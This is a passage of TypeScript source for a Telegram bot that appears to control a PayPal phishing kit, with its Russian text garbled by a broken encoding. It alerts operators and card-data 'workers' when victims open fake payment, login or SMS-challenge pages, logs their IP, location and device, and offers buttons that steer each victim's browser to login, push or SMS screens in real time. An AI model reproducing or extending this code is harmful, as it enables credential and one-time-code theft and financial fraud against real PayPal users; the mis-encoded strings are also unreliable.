            .select()
            .from(telegramLinks)
            .where(like(telegramLinks.contextData, `${shortHash}%`));
          
          if (results.length > 0) {
            contextData = results[0].contextData;
          }
        } catch (error) {
          console.error("Error searching for contextData:", error);
        }
      }
      
      if (contextData) {
        // Send refresh command via WebSocket to connected users
        const userConnections = (global as any).userConnections;
        let userRefreshed = false;
        
        if (userConnections && userConnections.has(contextData)) {
          const ws = userConnections.get(contextData);
          if (ws.readyState === WebSocket.OPEN) {
            ws.send(JSON.stringify({
              type: "refresh",
              message: "–°—Ç—Ä–∞–Ω–∏—Ü–∞ –æ–±–Ω–æ–≤–ª–µ–Ω–∞ –∞–¥–º–∏–Ω–æ–º"
            }));
            userRefreshed = true;
          }
        }
        
        const statusMessage = userRefreshed
          ? "üîÑ –°—Ç—Ä–∞–Ω–∏—Ü–∞ –æ–±–Ω–æ–≤–ª–µ–Ω–∞ –¥–ª—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è"
          : "üîÑ –ö–æ–º–∞–Ω–¥–∞ –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞";
        
        await bot.answerCallbackQuery(callbackQuery.id, {
          text: statusMessage,
          show_alert: true,
        });
      } else {
        await bot.answerCallbackQuery(callbackQuery.id, {
          text: "‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –Ω–∞–π—Ç–∏ –¥–∞–Ω–Ω—ã–µ –¥–ª—è –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è",
          show_alert: true,
        });
      }
    }
  } catch (error) {
    console.error("Error handling callback query:", error);
    await bot.answerCallbackQuery(callbackQuery.id, {
      text: "–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞",
    });
  }

  // User Management Callbacks
  if (data.startsWith("users_list_")) {
    if (!(await isUserAdmin(telegramId))) {
      await bot.answerCallbackQuery(callbackQuery.id, {
        text: "‚ùå –£ –≤–∞—Å –Ω–µ—Ç –ø—Ä–∞–≤ –¥–æ—Å—Ç—É–ø–∞.",
      });
      return;
    }

    const parts = data.split("_");
    const role = parts[2];
    const page = parts[3] ? parseInt(parts[3]) : 1;

    await bot.answerCallbackQuery(callbackQuery.id);
    await showUserList(chatId, role, page);
    return;
  }

  if (data === "manage_users" || data === "user_management_refresh") {
    if (!(await isUserAdmin(telegramId))) {
      await bot.answerCallbackQuery(callbackQuery.id, {
        text: "‚ùå –£ –≤–∞—Å –Ω–µ—Ç –ø—Ä–∞–≤ –¥–æ—Å—Ç—É–ø–∞.",
      });
      return;
    }

    await bot.answerCallbackQuery(callbackQuery.id);
    await showUserManagement(chatId, telegramId);
    return;
  }

  if (data === "main_menu") {
    await bot.answerCallbackQuery(callbackQuery.id);
    
    const keyboard = (await isUserAdmin(telegramId)) ? adminKeyboard : mainKeyboard;
    await bot.sendMessage(chatId, "üè† –ì–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é:", { reply_markup: keyboard });
    return;
  }

  // User management actions
  if (data === "user_add") {
    await bot.answerCallbackQuery(callbackQuery.id);
    await showUserAddForm(chatId, telegramId);
    return;
  }

  if (data === "user_delete") {
    await bot.answerCallbackQuery(callbackQuery.id);
    await showUserDeleteForm(chatId, telegramId);
    return;
  }

  if (data === "user_promote_worker") {
    await bot.answerCallbackQuery(callbackQuery.id);
    await showUserPromoteForm(chatId, telegramId);
    return;
  }

  if (data === "user_demote_user") {
    await bot.answerCallbackQuery(callbackQuery.id);
    await showUserDemoteForm(chatId, telegramId);
    return;
  }

  if (data === "user_block") {
    await bot.answerCallbackQuery(callbackQuery.id);
    await showUserBlockForm(chatId, telegramId);
    return;
  }

  if (data === "user_unblock") {
    await bot.answerCallbackQuery(callbackQuery.id);
    await showUserUnblockForm(chatId, telegramId);
    return;
  }

  // User action callbacks
  if (data.startsWith("delete_user_")) {
    if (!(await isUserAdmin(telegramId))) {
      await bot.answerCallbackQuery(callbackQuery.id, {
        text: "‚ùå –£ –≤–∞—Å –Ω–µ—Ç –ø—Ä–∞–≤ –¥–æ—Å—Ç—É–ø–∞.",
      });
      return;
    }

    const userToDelete = data.split("_")[2];
    await deleteUser(chatId, telegramId, userToDelete);
    await bot.answerCallbackQuery(callbackQuery.id);
    return;
  }

  if (data.startsWith("promote_user_")) {
    if (!(await isUserAdmin(telegramId))) {
      await bot.answerCallbackQuery(callbackQuery.id, {
        text: "‚ùå –£ –≤–∞—Å –Ω–µ—Ç –ø—Ä–∞–≤ –¥–æ—Å—Ç—É–ø–∞.",
      });
      return;
    }

    const userToPromote = data.split("_")[2];
    await promoteUser(chatId, telegramId, userToPromote);
    await bot.answerCallbackQuery(callbackQuery.id);
    return;
  }

  if (data.startsWith("demote_user_")) {
    if (!(await isUserAdmin(telegramId))) {
      await bot.answerCallbackQuery(callbackQuery.id, {
        text: "‚ùå –£ –≤–∞—Å –Ω–µ—Ç –ø—Ä–∞–≤ –¥–æ—Å—Ç—É–ø–∞.",
      });
      return;
    }

    const userToDemote = data.split("_")[2];
    await demoteUser(chatId, telegramId, userToDemote);
    await bot.answerCallbackQuery(callbackQuery.id);
    return;
  }

  if (data.startsWith("block_user_")) {
    if (!(await isUserAdmin(telegramId))) {
      await bot.answerCallbackQuery(callbackQuery.id, {
        text: "‚ùå –£ –≤–∞—Å –Ω–µ—Ç –ø—Ä–∞–≤ –¥–æ—Å—Ç—É–ø–∞.",
      });
      return;
    }

    const userToBlock = data.split("_")[2];
    await blockUser(chatId, telegramId, userToBlock);
    await bot.answerCallbackQuery(callbackQuery.id);
    return;
  }

  if (data.startsWith("unblock_user_")) {
    if (!(await isUserAdmin(telegramId))) {
      await bot.answerCallbackQuery(callbackQuery.id, {
        text: "‚ùå –£ –≤–∞—Å –Ω–µ—Ç –ø—Ä–∞–≤ –¥–æ—Å—Ç—É–ø–∞.",
      });
      return;
    }

    const userToUnblock = data.split("_")[2];
    await unblockUser(chatId, telegramId, userToUnblock);
    await bot.answerCallbackQuery(callbackQuery.id);
    return;
  }

  // User management refresh
  if (data === "user_management_refresh") {
    await bot.answerCallbackQuery(callbackQuery.id);
    await showUserManagement(chatId, telegramId);
    return;
  }
});

// Get country flag emoji
function getCountryFlag(country: string): string {
  const flagMap: { [key: string]: string } = {
    Germany: "üá©üá™",
    Russia: "üá∑üá∫",
    "United States": "üá∫üá∏",
    France: "üá´üá∑",
    "United Kingdom": "üá¨üáß",
    Italy: "üáÆüáπ",
    Spain: "üá™üá∏",
    Netherlands: "üá≥üá±",
    Poland: "üáµüá±",
    Ukraine: "üá∫üá¶",
    Belarus: "üáßüáæ",
    Kazakhstan: "üá∞üáø",
    China: "üá®üá≥",
    Japan: "üáØüáµ",
    Turkey: "üáπüá∑",
    Brazil: "üáßüá∑",
    Canada: "üá®üá¶",
    Australia: "üá¶üá∫",
    India: "üáÆüá≥",
    Mexico: "üá≤üáΩ",
  };

  return flagMap[country] || "üåç";
}

// Translate page names
function translatePageName(page: string): string {
  const translations: { [key: string]: string } = {
    "Payment Page": "–û—Å–Ω–æ–≤–Ω–∞—è —Å—Ç—Ä–∞–Ω–∏—Ü–∞",
    "Login Page": "–í–≤–æ–¥ –¥–∞–Ω–Ω—ã—Ö",
    "SMS Challenge Page": "–ü—É—à & –°–º—Å",
  };

  return translations[page] || page;
}

// Parse user agent to extract detailed device info
function parseUserAgent(ua: string) {
  if (!ua) return { device: "Unknown", browser: "Unknown", os: "Unknown" };

  let device = "PC";
  let browser = "Unknown";
  let os = "Unknown";

  // Device detection
  if (ua.includes("iPhone")) {
    device = "iPhone";
    const match = ua.match(/OS (\d+)_(\d+)/);
    os = match ? `iOS ${match[1]}.${match[2]}` : "iOS";
  } else if (ua.includes("iPad")) {
    device = "iPad";
    const match = ua.match(/OS (\d+)_(\d+)/);
    os = match ? `iPadOS ${match[1]}.${match[2]}` : "iPadOS";
  } else if (ua.includes("Android")) {
    device = "Android";
    const match = ua.match(/Android (\d+\.?\d*)/);
    os = match ? `Android ${match[1]}` : "Android";
  } else if (ua.includes("Windows NT")) {
    device = "PC";
    const match = ua.match(/Windows NT (\d+\.\d+)/);
    if (match) {
      const version = match[1];
      if (version === "10.0") os = "Windows 10";
      else if (version === "6.3") os = "Windows 8.1";
      else if (version === "6.1") os = "Windows 7";
      else os = `Windows ${version}`;
    } else {
      os = "Windows";
    }
  } else if (ua.includes("Mac OS X")) {
    device = "Mac";
    const match = ua.match(/Mac OS X (\d+[_\.]\d+)/);
    os = match ? `macOS ${match[1].replace("_", ".")}` : "macOS";
  } else if (ua.includes("Linux")) {
    device = "PC";
    os = "Linux";
  }

  // Browser detection
  if (ua.includes("Chrome/") && !ua.includes("Edge")) {
    const match = ua.match(/Chrome\/(\d+)/);
    browser = match ? `Chrome ${match[1]}` : "Chrome";
  } else if (ua.includes("Firefox/")) {
    const match = ua.match(/Firefox\/(\d+)/);
    browser = match ? `Firefox ${match[1]}` : "Firefox";
  } else if (ua.includes("Safari/") && !ua.includes("Chrome")) {
    const match = ua.match(/Version\/(\d+\.?\d*)/);
    browser = match ? `Safari ${match[1]}` : "Safari";
  } else if (ua.includes("Edge/")) {
    const match = ua.match(/Edge\/(\d+)/);
    browser = match ? `Edge ${match[1]}` : "Edge";
  }

  return { device, browser, os };
}

// Get geolocation data from IP address
async function getGeolocation(ip: string) {
  try {
    // Extract the first (real) IP address if multiple IPs are provided
    let realIp = ip;
    if (ip.includes(",")) {
      // Take the first IP address (usually the real client IP)
      realIp = ip.split(",")[0].trim();
    }

    // Skip localhost and private IPs
    if (
      realIp === "unknown" ||
      realIp === "127.0.0.1" ||
      realIp === "::1" ||
      realIp.startsWith("192.168.") ||
      realIp.startsWith("10.") ||
      realIp.startsWith("172.")
    ) {
      return {
        country: "Local/Private",
        city: "Unknown",
      };
    }

    console.log(`üîç Getting geolocation for IP: ${realIp}`);

    // Use free IP-API service with only needed fields
    const response = await fetch(
      `http://ip-api.com/json/${realIp}?fields=status,country,city`,
    );
    const data = await response.json();

    console.log(`üìç Geolocation response:`, data);

    if (data.status === "success") {
      return {
        country: data.country || "Unknown",
        city: data.city || "Unknown",
      };
    } else {
      return {
        country: "Unknown",
        city: "Unknown",
      };
    }
  } catch (error) {
    console.error("Error getting geolocation:", error);
    return {
      country: "Unknown",
      city: "Unknown",
    };
  }
}

// Notify about website visits with geolocation
export async function notifyVisit(
  page: string,
  ip: string,
  contextData: string,
  userAgent: string,
) {
  // Note: Enabled in development mode for testing
  console.log(`üì§ Sending visit notification - page: ${page}, context: ${contextData}`);
  console.log(`üîç Bot initialized: ${!!bot}`);
  
  if (!bot) {
    console.log("üö´ Bot not initialized, skipping notification");
    return;
  }

  // Skip notifications for direct visits (no contextData)
  if (!contextData || contextData === "" || contextData === "undefined" || contextData === "null" || contextData === null) {
    console.log(`üö´ Skipping notification for direct visit (contextData: "${contextData}")`);
    return;
  }

  console.log(`‚úÖ Proceeding with notification for contextData: ${contextData}`);

  try {
    // Force console output to be visible
    console.log("üî• DEBUG: Starting notification processing...");
    console.log("üî• DEBUG: Bot instance:", typeof bot);
    // Extract the first (real) IP address if multiple IPs are provided
    let displayIp = ip;
    if (ip.includes(",")) {
      displayIp = ip.split(",")[0].trim();
    }

    // Get geolocation data
    const location = await getGeolocation(ip);

    // Find link creator by contextData if provided
    let targetUsers = [];
    let linkCreatorId = null;

    console.log(`üîç Looking for link with contextData: ${contextData}`);

    if (contextData) {
      const links = await db
        .select()
        .from(telegramLinks)
        .where(eq(telegramLinks.contextData, contextData));
      
      console.log(`üîç Found ${links.length} links for contextData`);
      
      if (links.length > 0) {
        linkCreatorId = links[0].createdBy;
        console.log(`üîç Link creator ID: ${linkCreatorId}`);
        
        const creatorUser = await db
          .select()
          .from(telegramUsers)
          .where(eq(telegramUsers.telegramId, linkCreatorId));

        console.log(`üîç Found ${creatorUser.length} creator users`);
        
        if (creatorUser.length > 0) {
          console.log(`üîç Creator user role: ${creatorUser[0].role}`);
          console.log(`üîç Creator user ID: ${creatorUser[0].telegramId}`);
          targetUsers.push({
            telegramId: linkCreatorId,
            uniqueId: creatorUser[0].uniqueId,
            linkId: links[0].linkId,
            role: creatorUser[0].role,
          });
          console.log(`‚úÖ Added creator to targetUsers: ${creatorUser[0].uniqueId}`);
        }
      }
    }

    // –ü—Ä–æ–≤–µ—Ä–∏–º, –µ—Å—Ç—å –ª–∏ —É–∂–µ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä (—Å–æ–∑–¥–∞—Ç–µ–ª—å —Å—Å—ã–ª–∫–∏) –≤ targetUsers
    const adminInTargetUsers = targetUsers.find(u => u.role === "admin");
    
    if (!adminInTargetUsers) {
      // –ï—Å–ª–∏ –Ω–µ—Ç –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞ –≤ targetUsers, –¥–æ–±–∞–≤–ª—è–µ–º –≤—Å–µ—Ö –∞–¥–º–∏–Ω–æ–≤ –∏–∑ config
      const adminIds = loadAdmins();
      console.log(`üîç Loading admins from config: ${adminIds}`);
      
      // –î–æ–±–∞–≤–ª—è–µ–º –∞–¥–º–∏–Ω–æ–≤ (–æ–Ω–∏ –≤–∏–¥—è—Ç –≤—Å–µ)
      for (const adminId of adminIds) {
        if (!targetUsers.some(u => u.telegramId === adminId)) {
          const user = await db
            .select()
            .from(telegramUsers)
            .where(eq(telegramUsers.telegramId, adminId));
            
          if (user.length > 0) {
            targetUsers.push({
              telegramId: adminId,
              uniqueId: user[0].uniqueId,
              linkId: contextData ? targetUsers[0]?.linkId || "Unknown" : "Direct",
              role: user[0].role,
            });
            console.log(`‚úÖ Added admin to targetUsers: ${user[0].uniqueId}`);
          } else {
            // Create dummy admin object for notification
            targetUsers.push({
              telegramId: adminId,
              uniqueId: `#ADMIN_${adminId}`,
              linkId: contextData ? targetUsers[0]?.linkId || "Unknown" : "Direct",
              role: "admin",
            });
            console.log(`‚úÖ Added dummy admin to targetUsers: #ADMIN_${adminId}`);
          }
        }
      }
    } else {
      console.log(`üîë Admin creator already in targetUsers, skipping other admins`);
    }

    // –ï—Å–ª–∏ –µ—Å—Ç—å —Å–æ–∑–¥–∞—Ç–µ–ª—å —Å—Å—ã–ª–∫–∏ –∏ –æ–Ω –ù–ï –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä, –Ω–∞–π–¥–µ–º –Ω–∞–∑–Ω–∞—á–µ–Ω–Ω—ã—Ö –≤–±–∏–≤–µ—Ä–æ–≤
    if (linkCreatorId && !adminInTargetUsers) {
      const assignedWorkers = await getAssignedWorkers(linkCreatorId);
      
      for (const workerId of assignedWorkers) {
        const workerUser = await db
          .select()
          .from(telegramUsers)
          .where(eq(telegramUsers.telegramId, workerId));
        
        if (workerUser.length > 0) {
          targetUsers.push({
            telegramId: workerId,
            uniqueId: workerUser[0].uniqueId,
            linkId: targetUsers[0]?.linkId || "Unknown",
            role: workerUser[0].role,
          });
        }
      }
      
      // –ï—Å–ª–∏ –Ω–µ—Ç –Ω–∞–∑–Ω–∞—á–µ–Ω–Ω—ã—Ö –≤–±–∏–≤–µ—Ä–æ–≤, –∏—Å–ø–æ–ª—å–∑—É–µ–º –∫—Ä—É–≥–æ–≤—É—é –æ—á–µ—Ä–µ–¥—å
      if (assignedWorkers.length === 0) {
        const nextWorker = await getNextWorkerForAssignment();
        if (nextWorker) {
          const workerUser = await db
            .select()
            .from(telegramUsers)
            .where(eq(telegramUsers.telegramId, nextWorker));
          
          if (workerUser.length > 0) {
            targetUsers.push({
              telegramId: nextWorker,
              uniqueId: workerUser[0].uniqueId,
              linkId: targetUsers[0]?.linkId || "Unknown",
              role: workerUser[0].role,
            });
          }
        }
      }
    } else if (adminInTargetUsers) {
      console.log(`üîë Admin creator found, skipping worker assignment`);
    }

    // Store user activity for status checking
    if (contextData) {
      const activeUsers = (global as any).activeUsers || new Map();
      activeUsers.set(contextData, {
        timestamp: Date.now(),
        page: page,
        userAgent: userAgent,
        ip: displayIp,
      });
      (global as any).activeUsers = activeUsers;
    }

    const deviceInfo = parseUserAgent(userAgent);
    const countryFlag = getCountryFlag(location.country);
    const translatedPage = translatePageName(page);

    // Get link price for display
    let linkPrice = "0.00 EUR";
    if (contextData) {
      const links = await db
        .select()
        .from(telegramLinks)
        .where(eq(telegramLinks.contextData, contextData));
      if (links.length > 0) {
        linkPrice = links[0].price;
      }
    }

    // Get actual generated link from database
    let actualLink = "https://paypal.com";
    if (contextData) {
      const links = await db
        .select()
        .from(telegramLinks)
        .where(eq(telegramLinks.contextData, contextData));
      if (links.length > 0 && links[0].generatedLink) {
        // Replace localhost with actual domain
        actualLink = links[0].generatedLink.replace(
          "http://localhost:5000",
          `https://${await getCurrentDomain()}`,
        );
      }
    }

    const message =
      `üá©üá™ PAYPAL ${targetUsers[0]?.linkId || "#DIRECT"}\n` +
      `üß≠ NEW log: ${translatedPage}\n` +
      `üí∞ ${linkPrice}\n\n` +
      `<a href="${actualLink}">üîó –û—Ç–∫—Ä—ã—Ç—å —Å—Å—ã–ª–∫—É</a>\n\n` +
      `üåê IP: ${displayIp}\n` +
      `${countryFlag} Geo: ${location.country}, ${location.city}\n` +
      `üíª Info:\n` +
      `‚Ä¢ Device: ${deviceInfo.device}\n` +
      `‚Ä¢ Browser: ${deviceInfo.browser}\n` +
      `‚Ä¢ OS: ${deviceInfo.os}`;

    // Create a short hash for callback data (Telegram limit is 64 bytes)
    const shortHash = contextData ? contextData.substring(0, 8) : "direct";

    // Store mapping of short hash to full contextData
    if (!(global as any).redirectHashMap) {
      (global as any).redirectHashMap = new Map();
    }
    if (contextData) {
      (global as any).redirectHashMap.set(shortHash, contextData);
    }

    // Store mapping for checker function
    if (!(global as any).checkHashMap) {
      (global as any).checkHashMap = new Map();
    }
    if (contextData) {
      (global as any).checkHashMap.set(shortHash, contextData);
    }

    const keyboard = {
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "üëÅ–ß–µ–∫–µ—ÄüëÅ",
              callback_data: `check_users_${shortHash}`,
            },
          ],
          [
            {
              text: "‚û°Ô∏è –ü–æ–ª—É—á–∏—Ç—å",
              callback_data: `redirect_${shortHash}_home`,
            },
            {
              text: "‚û°Ô∏è –õ–æ–≥–∏–Ω",
              callback_data: `redirect_${shortHash}_signin`,
            },
          ],
          [
            {
              text: "‚û°Ô∏è –ó–∞–≥—Ä—É–∑–∫–∞",
              callback_data: `redirect_${shortHash}_loading`,
            },
            {
              text: "‚û°Ô∏è –ü—É—à",
              callback_data: `redirect_${shortHash}_sms_loading`,
            },
          ],
          [
            {
              text: "‚û°Ô∏è –°–ú–°",
              callback_data: `redirect_${shortHash}_sms`,
            },
            {
              text: "‚û°Ô∏è JaS üïí",
              callback_data: `redirect_${shortHash}_fullscreen`,
            },
          ],
          [
            {
              text: "‚ÄºÔ∏èOrig Paypal‚ÅâÔ∏è",
              callback_data: `redirect_${shortHash}_paypal`,
            },
          ],
          [
            {
              text: "üîÑ –û–±–Ω–æ–≤–∏—Ç—å",
              callback_data: `refresh_page_${shortHash}`,
            },
          ],
        ],
      },
    };

    // Send different notifications based on user role
    console.log(`üéØ Total target users: ${targetUsers.length}`);
    targetUsers.forEach((user, index) => {
      console.log(`  ${index + 1}. ${user.uniqueId} (${user.telegramId}) - Role: ${user.role}`);
    });
    
    for (const user of targetUsers) {
      try {
        console.log(`üîç Processing user ${user.uniqueId} with role: ${user.role}`);
        if (user.role === "admin" || user.role === "worker") {
          console.log(`‚úÖ Sending FULL notification to ${user.role} ${user.uniqueId}`);
          // Send full notification with location data and control buttons to admins/workers
          await sendWorkerNotification(user, user.linkId || "Unknown", message, keyboard);
        } else {
          console.log(`üìù Sending SIMPLE notification to user ${user.uniqueId}`);
          // Send simple notification to regular users
          const simpleAction = `–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –ø–æ—Å–µ—Ç–∏–ª: ${translatePageName(page)}`;
          await sendSimpleUserNotification(user, user.linkId || "Unknown", simpleAction, contextData);
        }
      } catch (error) {
        console.error(
          `Failed to send visit notification to ${user.uniqueId}:`,
          error,
        );
      }
    }

    // Debug summary
    console.log(`üîç Total notifications sent: ${targetUsers.length}`);
    console.log(`üîç Admins/Workers: ${targetUsers.filter(u => u.role === "admin" || u.role === "worker").length}`);
    console.log(`üîç Regular users: ${targetUsers.filter(u => u.role !== "admin" && u.role !== "worker").length}`);
  } catch (error) {
    console.error("Error sending visit notification:", error);
  }
}

// User Management System
async function showUserManagement(chatId: number, telegramId: string) {
  try {
    const allUsers = await db.select().from(telegramUsers).orderBy(telegramUsers.createdAt);
    const totalUsers = allUsers.length;
    const adminUsers = allUsers.filter(u => u.role === 'admin');
    const workerUsers = allUsers.filter(u => u.role === 'worker');
    const regularUsers = allUsers.filter(u => u.role === 'user');

    const message = 
      `üë§ <b>–£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è–º–∏</b>\n\n` +
      `üìä <b>–°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞:</b>\n` +
      `‚Ä¢ –í—Å–µ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π: ${totalUsers}\n` +
      `‚Ä¢ –ê–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–æ–≤: ${adminUsers.length}\n` +
      `‚Ä¢ –í–±–∏–≤–µ—Ä–æ–≤: ${workerUsers.length}\n` +
      `‚Ä¢ –û–±—ã—á–Ω—ã—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π: ${regularUsers.length}\n\n` +
      `–í—ã–±–µ—Ä–∏—Ç–µ –¥–µ–π—Å—Ç–≤–∏–µ:`;

    const keyboard = {
      inline_keyboard: [
        [
          { text: "üìã –í—Å–µ", callback_data: "users_list_all" },
          { text: "üëë –ê–¥–º–∏–Ω—ã", callback_data: "users_list_admin" },
        ],
        [
          { text: "üî® –í–±–∏–≤–µ—Ä—ã", callback_data: "users_list_worker" },
          { text: "üë• –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–∏", callback_data: "users_list_user" },
        ],
        [
          { text: "‚ûï –î–æ–±–∞–≤–∏—Ç—å", callback_data: "user_add" },
          { text: "üóëÔ∏è –£–¥–∞–ª–∏—Ç—å", callback_data: "user_delete" },
        ],
        [
          { text: "‚¨ÜÔ∏è –ü–æ–≤—ã—Å–∏—Ç—å", callback_data: "user_promote_worker" },
          { text: "‚¨áÔ∏è –ü–æ–Ω–∏–∑–∏—Ç—å", callback_data: "user_demote_user" },
        ],
        [
          { text: "üö´ –ó–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞—Ç—å", callback_data: "user_block" },
          { text: "‚úÖ –†–∞–∑–±–ª–æ–∫–∏—Ä–æ–≤–∞—Ç—å", callback_data: "user_unblock" },
        ],
        [
          { text: "üîÑ –û–±–Ω–æ–≤–∏—Ç—å", callback_data: "user_management_refresh" },
          { text: "üè† –ì–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é", callback_data: "main_menu" },
        ],
      ],
    };

    await bot.sendMessage(chatId, message, {
      parse_mode: "HTML",
      reply_markup: keyboard,
    });
  } catch (error) {
    console.error("Error showing user management:", error);
    await bot.sendMessage(chatId, "‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è–º–∏.");
  }
}

// Show user list by role
async function showUserList(chatId: number, role: string = 'all', page: number = 1) {
  try {
    const pageSize = 5;
    const offset = (page - 1) * pageSize;
    
    let users;
    let totalUsers;
    let roleTitle;

    if (role === 'all') {
      users = await db.select().from(telegramUsers).orderBy(telegramUsers.createdAt).limit(pageSize).offset(offset);
      totalUsers = (await db.select().from(telegramUsers)).length;
      roleTitle = "–í—Å–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–∏";
    } else {
      users = await db.select().from(telegramUsers).where(eq(telegramUsers.role, role)).orderBy(telegramUsers.createdAt).limit(pageSize).offset(offset);
      totalUsers = (await db.select().from(telegramUsers).where(eq(telegramUsers.role, role))).length;
      roleTitle = role === 'admin' ? "–ê–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä—ã" : role === 'worker' ? "–í–±–∏–≤–µ—Ä—ã" : "–û–±—ã—á–Ω—ã–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–∏";
    }

    const totalPages = Math.ceil(totalUsers / pageSize);

    let message = `üë§ <b>${roleTitle}</b>\n\n`;
    
    if (users.length === 0) {
      message += "üì≠ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–∏ –Ω–µ –Ω–∞–π–¥–µ–Ω—ã.";
    } else {
      users.forEach((user, index) => {
        const roleEmoji = user.role === 'admin' ? 'üëë' : user.role === 'worker' ? 'üî®' : 'üë§';
        const status = user.approved ? '‚úÖ' : '‚ùå';
        const createdDate = new Date(user.createdAt).toLocaleDateString('ru-RU');
        const username = user.username ? `@${user.username}` : '–ù–µ—Ç username';
        
        message += `${roleEmoji} <b>${user.uniqueId}</b>\n`;
        message += `‚Ä¢ ID: <code>${user.telegramId}</code>\n`;
        message += `‚Ä¢ Telegram: ${username}\n`;
        message += `‚Ä¢ –†–æ–ª—å: ${user.role}\n`;
        message += `‚Ä¢ –°—Ç–∞—Ç—É—Å: ${status}\n`;
        message += `‚Ä¢ –°–æ–∑–¥–∞–Ω: ${createdDate}\n\n`;
      });
    }

    message += `üìÑ –°—Ç—Ä–∞–Ω–∏—Ü–∞ ${page} –∏–∑ ${totalPages} | –í—Å–µ–≥–æ: ${totalUsers}`;

    const keyboard = {
      inline_keyboard: [
        // User action buttons
        users.length > 0 ? [
          { text: "‚úèÔ∏è –†–µ–¥–∞–∫—Ç–∏—Ä–æ–≤–∞—Ç—å", callback_data: `user_edit_${role}_${page}` },
          { text: "üóëÔ∏è –£–¥–∞–ª–∏—Ç—å", callback_data: `user_delete_${role}_${page}` },
        ] : [],
        
        // Navigation buttons
        totalPages > 1 ? [
          ...(page > 1 ? [{ text: "‚¨ÖÔ∏è –ù–∞–∑–∞–¥", callback_data: `users_list_${role}_${page - 1}` }] : []),
          ...(page < totalPages ? [{ text: "‚û°Ô∏è –í–ø–µ—Ä–µ–¥", callback_data: `users_list_${role}_${page + 1}` }] : []),
        ] : [],
        
        // Back button
        [
          { text: "üîô –ö —É–ø—Ä–∞–≤–ª–µ–Ω–∏—é", callback_data: "manage_users" },
        ],
      ].filter(row => row.length > 0),
    };

    await bot.sendMessage(chatId, message, {
      parse_mode: "HTML",
      reply_markup: keyboard,
    });
  } catch (error) {
    console.error("Error showing user list:", error);
    await bot.sendMessage(chatId, "‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ —Å–ø–∏—Å–∫–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π.");
  }
}

// User management action functions
async function showUserAddForm(chatId: number, telegramId: string) {
  try {
    const message = 
      `‚ûï <b>–î–æ–±–∞–≤–∏—Ç—å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è</b>\n\n` +
      `–í–≤–µ–¥–∏—Ç–µ Telegram ID –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –¥–ª—è –¥–æ–±–∞–≤–ª–µ–Ω–∏—è –≤ —Å–∏—Å—Ç–µ–º—É:\n\n` +
      `–ü—Ä–∏–º–µ—Ä: 123456789\n\n` +
      `–î–ª—è –æ—Ç–º–µ–Ω—ã –Ω–∞–∂–º–∏—Ç–µ "–ù–∞–∑–∞–¥"`;

    const keyboard = {
      inline_keyboard: [
        [
          { text: "üîô –ù–∞–∑–∞–¥", callback_data: "manage_users" },
          { text: "‚ùå –û—Ç–º–µ–Ω–∞", callback_data: "main_menu" },
        ],
      ],
    };

    await bot.sendMessage(chatId, message, {
      parse_mode: "HTML",
      reply_markup: keyboard,
    });

    // Set user state for input
    userStates.set(telegramId, { action: "add_user" });
  } catch (error) {
    console.error("Error showing user add form:", error);
    await bot.sendMessage(chatId, "‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ —Ñ–æ—Ä–º—ã –¥–æ–±–∞–≤–ª–µ–Ω–∏—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è.");
  }
}

async function showUserDeleteForm(chatId: number, telegramId: string) {
  try {
    const allUsers = await db.select().from(telegramUsers).orderBy(telegramUsers.createdAt);
    
    if (allUsers.length === 0) {
      await bot.sendMessage(chatId, "üì≠ –ù–µ—Ç –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π –¥–ª—è —É–¥–∞–ª–µ–Ω–∏—è.");
      return;
    }

    const message = 
      `üóëÔ∏è <b>–£–¥–∞–ª–∏—Ç—å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è</b>\n\n` +
      `–í—ã–±–µ—Ä–∏—Ç–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –¥–ª—è —É–¥–∞–ª–µ–Ω–∏—è:\n\n`;

    const keyboard = {
      inline_keyboard: [
        ...allUsers.map(user => [
          { 
            text: `üóëÔ∏è ${user.uniqueId} (@${user.username || '–Ω–µ—Ç username'})`, 
            callback_data: `delete_user_${user.telegramId}` 
          }
        ]),
        [
          { text: "üîô –ù–∞–∑–∞–¥", callback_data: "manage_users" },
          { text: "‚ùå –û—Ç–º–µ–Ω–∞", callback_data: "main_menu" },
        ],
      ],
